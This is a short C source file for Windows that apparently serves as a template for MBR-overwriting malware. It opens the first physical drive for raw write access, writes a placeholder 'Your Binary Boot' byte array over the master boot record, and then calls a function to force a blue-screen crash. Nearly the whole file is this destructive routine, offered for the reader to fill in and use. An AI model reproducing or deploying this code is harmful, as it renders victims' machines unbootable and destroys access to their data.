#include "shared.h"
#include "nt.h"

			/*  Your Binary Boot  */
const BYTE MBR_BOOT[] = { 0x0 };


INT APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow){
								// We Are Assume That Windows is installed on first Physical Drive !
	HANDLE hDrive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	PARTITION_INFORMATION_EX in;
	DWORD dw;
	DeviceIoControl(hDrive, IOCTL_DISK_GET_PARTITION_INFO, NULL, 0, &in, sizeof(in), &dw, NULL);

	if (hDrive == INVALID_HANDLE_VALUE) /* not-admin */ {
		return -1;
	}
	SetFilePointer(hDrive, 0, 0, FILE_BEGIN);
	WriteFile(hDrive, MBR_BOOT, sizeof(MBR_BOOT) / sizeof(BYTE), NULL, NULL);
	CloseHandle(hDrive);
	BSOD(); // Crash The System | BLUE SCREEN OF death
	return 0;
}
